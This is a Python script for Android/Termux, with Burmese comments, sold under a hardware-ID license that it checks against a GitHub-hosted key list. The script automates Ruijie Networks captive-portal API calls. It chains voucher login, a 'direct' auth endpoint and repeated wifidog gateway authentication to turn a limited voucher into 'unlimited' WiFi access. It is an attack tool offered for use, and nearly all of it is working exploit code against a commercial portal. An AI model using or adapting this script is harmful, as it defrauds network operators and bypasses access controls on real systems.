import re
import os
import sys
import time
import uuid
import hashlib
import requests
import subprocess

# --- System Colors ---
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def line():
    try:
        print(os.get_terminal_size()[0] * "\033[1;00m-")
    except:
        print(40 * "\033[1;00m-")

# တစ်ယောက်ချင်းစီအတွက် လုံးဝ Unique ဖြစ်စေမည့် HWID ထုတ်ပေးသည့် Function
def get_uid():
    try:
        # ဖုန်းရဲ့ Brand နဲ့ Model ကိုရယူခြင်း
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        brand = subprocess.check_output(['getprop', 'ro.product.manufacturer']).decode().strip()
        
        # Storage ထဲမှာ အမြဲတမ်းရှိနေမယ့် သီးသန့် ID ဖိုင်လေးတစ်ခု ဆောက်ခြင်း
        path = '/sdcard/.txi_hwid.dat'
        if not os.path.exists(path):
            generated_id = uuid.uuid4().hex[:16].upper()
            try:
                with open(path, 'w') as f: f.write(generated_id)
            except:
                pass
        else:
            try:
                with open(path, 'r') as f: generated_id = f.read().strip()
            except:
                generated_id = "GENERATED_FALLBACK"

        # အားလုံးကိုပေါင်းပြီး အရှည် ၂၀ ရှိတဲ့ သီးသန့် Key တစ်ခုအဖြစ် ပြောင်းလဲခြင်း
        raw_hwid = f"{brand}_{model}_{generated_id}".replace(" ", "")
        return hashlib.sha256(raw_hwid.encode()).hexdigest()[:20].upper()
    except:
        # အထက်ပါနည်းလမ်း အလုပ်မလုပ်ပါက ဒုတိယမြောက် စိတ်ချရသော နည်းလမ်းဖြင့် ထုတ်ပေးခြင်း
        try:
            fallback = str(os.fstat(0).st_dev) + str(os.fstat(0).st_ino)
            return hashlib.sha256(fallback.encode()).hexdigest()[:20].upper()
        except:
            return "MY_UNKNOWN_HWID_KEY"

def check_security():
    os.system('clear')
    
    # Storage permission လိုအပ်သောကြောင့် စစ်ဆေးခြင်း
    if not os.path.exists('/sdcard'):
        os.system('termux-setup-storage')
        print(f"{y}[!] Please grant storage permission and restart the tool.")
        sys.exit(0)
        
    my_id = get_uid()
    print(f"{y}[*] Checking license authentication...")
    
    url = "https://raw.githubusercontent.com/hhtethtet277-svg/wi/refs/heads/main/key.txt"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            for l in lines:
                if my_id in l:
                    if "|" in l:
                        _, exp_date = l.split("|", 1)
                        return True, exp_date.strip()
                    return True, "Verified Member"
            
            # ID မရှိပါက ပိတ်မည်
            print(f"{r}--------------------------------------------------")
            print(f"{r}[!] Your Device HWID is not registered.")
            print(f"{y}[*] Your Unique HWID: {w}{my_id}")
            print(f"{y}[*] Please contact the Developer for registration.")
            print(f"{r}--------------------------------------------------")
            sys.exit(0)
        else:
            print(f"{r}[!] Failed to connect server database. (Status: {response.status_code})")
            sys.exit(0)
    except Exception as e:
        print(f"{r}[!] Connection error occurred. Please check internet connection.")
        sys.exit(0)

def Logo(expiry_status):
    os.system('clear')
    logo = f"""{g}  _    _ _   _ _      _____ __  __ _____ _______ ______ _____  
 | |  | | \ | | |    |_   _|  \/  |_   _|__   __|  ____|  __ \ 
 | |  | |  \| | |      | | | \  / | | |    | |  | |__  | |  | |
 | |  | | . ` | |      | | | |\/| | | |    | |  |  __| | |  | |
 | |__| | |\  | |____ _| |_| |  | |_| |_   | |  | |____| |__| |
  \____/|_| \_|______|_____|_|  |_|_____|  |_|  |______|_____/ 
                                                               
{y}                 Created by TxiJuNaing\033[1;00m"""
    print(logo)
    line()
    print(f"{w}[♠️] Owner: @Nain663")
    print(f"{w}[♣️] Telegram Account: @starlink663 && @starlink987")
    print(f"{g}[♦️] Status: {y}{expiry_status}")
    print(f"{w}[♥️] Mode: Ruijie WiFi (unlimited Change) ")
    line()

def get_session_id(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie':'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        response = requests.get(session_url, headers=headers)
        session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url).group(1)
    except:
        print("\033[1;31mError retrieving session ID.")
        sys.exit(1)
    return session_id

def login_voucher(session_id, voucher):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 2}
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36',
    }
    try:
        with requests.post(post_url, json=data, headers=headers) as response:
            res_text = response.text
            if "Authentication failed" in res_text or "expired" in res_text or "Expired" in res_text:
                print("\033[1;33mVoucher code {} incorrect".format(voucher))
                sys.exit(1)
            else:
                return re.search('token=(.*?)&', res_text).group(1)
    except:
        print("\033[1;31mAuthentication Exception Error.")
        sys.exit(1)

def OneClick(token):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    json_data = {'phoneNumber':'', 'sessionId': token}
    try:
        response = requests.post('https://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US', headers=headers, json=json_data)
        return re.search('token=(.*?)&', response.text).group(1)
    except:
        return None
    
def Auth_as_Unlimited(voucher, ip, session_url):
    for i in range(3):
        session_id = get_session_id(session_url)
        print("\033[1;32mFinal Inactive Session Id: ", session_id)
        line()
        token = login_voucher(session_id, voucher)
        if token:
            print("\033[1;00mFinal Active Session Id:\033[1;32m ", token)
            line()
            token = OneClick(token)
            if token:
                auth(ip=ip, token=token, final=True)
                print("\033[1;32mSuccessful to change into unlimited")
                break
            else:
                print("\033[1;31mAttempt {} failed".format(i))
                line()
        else:
            print("\033[1;31mFailed to Authenticate.")
    
def auth(voucher=None, ip=None, token=None, session_url=None, final=False):
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    params = {'token': token, 'phoneNumber': ''}
    response = requests.get(f'http://{ip}:2060/wifidog/auth', params=params, headers=headers).url
    if "success" in response or 'baidu.com' in response or "ruijie.com" in response:
        print("\033[1;32mSuccessfully Authenticated")
        line()
        if not final:
            Auth_as_Unlimited(voucher, ip, session_url)
    else:
        print("\033[1;31mFailed to Authenticate: {}".format(response))

def current_wifi(expiry_status):
    Logo(expiry_status)
    voucher = input("\033[1;00mEnter Voucher Code:\033[1;32m ")
    line()
    print("\033[1;33mThe Mac Address from Session URL must be the same as the Mac Address of the User Connected WiFi.")
    line()
    session_url = input("\033[1;00mEnter Session Url: \033[1;34m")
    line()
    ip = input("\033[1;00mEnter Your WiFi Gateway: \033[1;34m")
    line()
    session_id = get_session_id(session_url)
    token = login_voucher(session_id, voucher)
    if ip:
        auth(voucher, ip, token, session_url)
    else:
        print("\033[1;31mFailed to retrieve IP address.")

if __name__ == "__main__":
    try:
        is_valid, expiry_info = check_security()
        if is_valid:
            current_wifi(expiry_info)
    except KeyboardInterrupt:
        print(f"\n{y}[!] Stopped by User.")
